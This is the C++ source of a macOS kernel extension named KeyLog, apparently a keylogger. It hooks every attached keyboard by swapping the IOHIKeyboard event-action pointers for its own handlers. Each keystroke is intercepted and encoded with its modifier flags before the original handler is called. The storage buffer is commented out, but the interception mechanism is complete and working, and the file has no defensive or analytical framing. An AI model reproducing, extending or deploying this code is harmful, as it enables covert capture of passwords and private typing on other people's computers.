/* add your code here */

#include <IOKit/IOLib.h>
#include "KeyLog.h"

com_prebeg_kext_KeyLog		*logService;
KeyboardEventAction         origAction;
KeyboardSpecialEventAction	origSpecialAction;

// This required macro defines the class's constructors, destructors,
// and several other methods I/O Kit requires.
OSDefineMetaClassAndStructors(com_prebeg_kext_KeyLog, IOService)

// Define the driver's superclass.
#define super IOService

void specialAction(OSObject * target,
                   /* eventType */        unsigned   eventType,
                   /* flags */            unsigned   flags,
                   /* keyCode */          unsigned   key,
                   /* specialty */        unsigned   flavor,
                   /* source id */        UInt64     guid,
                   /* repeat */           bool       repeat,
                   /* atTime */           AbsoluteTime ts)
{
    if ((eventType==NX_SYSDEFINED)&&(!flags)&&(key==NX_NOSPECIALKEY))       // only sign of a logout (also thrown when sleeping)
        logService->clearKeyboards();
    
    if (origSpecialAction)
        (*origSpecialAction)(target,eventType,flags,key,flavor,guid,repeat,ts);
}

void logAction(OSObject * target,
               /* eventFlags  */      unsigned   eventType,
               /* flags */            unsigned   flags,
               /* keyCode */          unsigned   key,
               /* charCode */         unsigned   charCode,
               /* charSet */          unsigned   charSet,
               /* originalCharCode */ unsigned   origCharCode,
               /* originalCharSet */  unsigned   origCharSet,
               /* keyboardType */     unsigned   keyboardType,
               /* repeat */           bool       repeat,
               /* atTime */           AbsoluteTime ts)
{
    if ((eventType==NX_KEYDOWN)&&logService)
        logService->logStroke(key, flags, charCode);
    if (origAction)
        (*origAction)(target,eventType,flags,key,charCode,charSet,origCharCode,origCharSet,keyboardType,repeat,ts);
}

void com_prebeg_kext_KeyLog::logStroke( unsigned key, unsigned flags, unsigned charCode )
{
    
    /*  changed to allow for dynamic key mappings:
     - Keys are transmitted to userspace as 2 byte half-words
     - The top 5 bits of the half-word indicate the flags
     the order from high to low is:
     case (Shift or Caps)
     ctrl
     alt
     cmd
     fn
     - The bottom 11 bits contain the key itself (2048 is plenty big)
     */
    
    u_int16_t keyData = key;
    keyData &= 0x07ff;                      // clear the top 5 bits
    
    if ((flags & CAPS_FLAG)||(flags & SHIFT_FLAG))
        keyData |= 0x8000;
    
    if (flags & CTRL_FLAG)
        keyData |= 0x4000;
    
    if (flags & ALT_FLAG)
        keyData |= 0x2000;
    
    if (flags & CMD_FLAG)
        keyData |= 0x1000;
    
    if (flags & FN_FLAG)
        keyData |= 0x0800;
    
#ifdef DEBUG
    IOLog( "%s::key [%c] (%04x)\n", getName(), keyData, keyData );
#endif

    /*
    if (!buffsize)
        bzero(fMemBuf,MAX_BUFF_SIZE);

    memcpy(fMemBuf+buffsize,&keyData,sizeof(keyData));
    buffsize+=sizeof(keyData);
    
    if (buffsize>(9*MAX_BUFF_SIZE/10))
    {
#ifdef DEBUG
        IOLog( "%s::Error: buffer overflow\n", getName() );
#endif
        
        buffsize=0;
    }
    */
}

/* INHERITED */

bool com_prebeg_kext_KeyLog::init(OSDictionary *dict)
{
    IOLog("%s::%s\n", "com_prebeg_kext_KeyLog", __FUNCTION__);

    bool result = super::init(dict);
    
    origAction = NULL;
    origSpecialAction = NULL;
    
    kextKeys = 0;
    logService = this;
    
	notify = NULL;
	notifyTerm = NULL;

    loggedKeyboards = new OSArray();
    loggedKeyboards->initWithCapacity(1);
    
    return result;
}

void com_prebeg_kext_KeyLog::free(void)
{
    IOLog("%s::%s\n", getName(), __FUNCTION__);

    super::free();
}

IOService *com_prebeg_kext_KeyLog::probe(IOService *provider, SInt32 *score)
{
    IOLog("%s::%s\n", getName(), __FUNCTION__);
    
    IOService *result = super::probe(provider, score);
    return result;
}

bool com_prebeg_kext_KeyLog::terminationHandler(void *target, void *ref, IOService *newServ, IONotifier *notifier)
{
	com_prebeg_kext_KeyLog* self = OSDynamicCast(com_prebeg_kext_KeyLog, (OSMetaClassBase*)target );
	if (!self)
		return false;

	if (!self->loggedKeyboards)
		return false;
	
	IOHIKeyboard* keyboard = OSDynamicCast( IOHIKeyboard, newServ);
	if (!keyboard)
		return false;

	int index = self->loggedKeyboards->getNextIndexOfObject(keyboard, 0);
	if (index>=0)
	{
		self->kextKeys--;
		self->loggedKeyboards->removeObject(index);
	}

	return true;
}

bool com_prebeg_kext_KeyLog::notificationHandler(void *target, void *ref, IOService *newServ, IONotifier *notifier)
{
    com_prebeg_kext_KeyLog* self = OSDynamicCast( com_prebeg_kext_KeyLog, (OSMetaClassBase*)target );
    if (!self)
        return false;
    
#ifdef DEBUG
    IOLog( "%s::Notification handler called\n", self->getName() );
#endif
    
    IOHIKeyboard*   keyboard = OSDynamicCast( IOHIKeyboard, newServ );
    if (!keyboard)
        return false;
    
    if (!keyboard->_keyboardEventTarget)
    {
#ifdef DEBUG
        IOLog( "%s::No Keyboard event target\n", self->getName());
#endif
        
        return false;
    }
    // event target must be IOHIDSystem
    
    IOService*      targetServ = OSDynamicCast( IOService, keyboard->_keyboardEventTarget );
    if (targetServ)
    {
#ifdef DEBUG
        IOLog( "%s::Keyboard event target is %s\n", self->getName(), targetServ->getName());
#endif
    }
    
    if (!keyboard->_keyboardEventTarget->metaCast("IOHIDSystem"))
        return false;

    // we have a valid keyboard to be logged
#ifdef DEBUG
    IOLog( "%s::Adding keyboard %p\n", self->getName(),keyboard );
#endif
    
    
    int index = self->loggedKeyboards->getNextIndexOfObject(keyboard,0);
    if (index<0)
    {       
        self->loggedKeyboards->setObject(keyboard);
        self->kextKeys++;
    }
    
    origAction = keyboard->_keyboardEventAction;            // save the original action
    keyboard->_keyboardEventAction = (KeyboardEventAction) logAction;       // apply the new action
    
    origSpecialAction = keyboard->_keyboardSpecialEventAction;              // save the original action
    keyboard->_keyboardSpecialEventAction = (KeyboardSpecialEventAction) specialAction;     // apply the new action
    
    return true;
}

void com_prebeg_kext_KeyLog::clearKeyboards()
{
#ifdef DEBUG
    IOLog( "%s::Clear keyboards called with kextkeys %d!\n", getName(), kextKeys );
#endif
    
    if (loggedKeyboards)
    {
        int arraySize = loggedKeyboards->getCount();
        for (int i=0; i<arraySize; i++)
        {
            IOHIKeyboard *curKeyboard = (IOHIKeyboard*)loggedKeyboards->getObject(0);
            
            if (origSpecialAction)
                curKeyboard->_keyboardSpecialEventAction = origSpecialAction;
            if (origAction)
                curKeyboard->_keyboardEventAction = origAction;
            
            loggedKeyboards->removeObject(0);
            kextKeys--;
        }
    }
    origSpecialAction = NULL;
    origAction = NULL;
    kextKeys=0;
}

void com_prebeg_kext_KeyLog::activate()
{
    IOLog("%s::%s\n", getName(), __FUNCTION__);
   
	notifyTerm = addMatchingNotification(gIOTerminatedNotification, serviceMatching("IOHIKeyboard"), (IOServiceMatchingNotificationHandler)&com_prebeg_kext_KeyLog::terminationHandler, this);

	return;
}

void com_prebeg_kext_KeyLog::deactivate()
{
    IOLog("%s::%s\n", getName(), __FUNCTION__);

    if (notify)
		notify->remove();
	notify = NULL;

	clearKeyboards();

	return;
}

bool com_prebeg_kext_KeyLog::start(IOService *provider)
{
    IOLog("%s::%s\n", getName(), __FUNCTION__);

    bool result = super::start(provider);
    
	registerService();

    notify = addMatchingNotification(gIOPublishNotification, serviceMatching("IOHIKeyboard"), (IOServiceMatchingNotificationHandler)&com_prebeg_kext_KeyLog::notificationHandler, this);

	activate();

	if (!result)
	{
		stop(provider);
		return false;
	}

    return result;
}

void com_prebeg_kext_KeyLog::stop(IOService *provider)
{
    IOLog("%s::%s\n", getName(), __FUNCTION__);
		
	if (notifyTerm)
		notifyTerm->remove();

    logService = NULL;

	deactivate();

	loggedKeyboards->release();

    super::stop(provider);
}

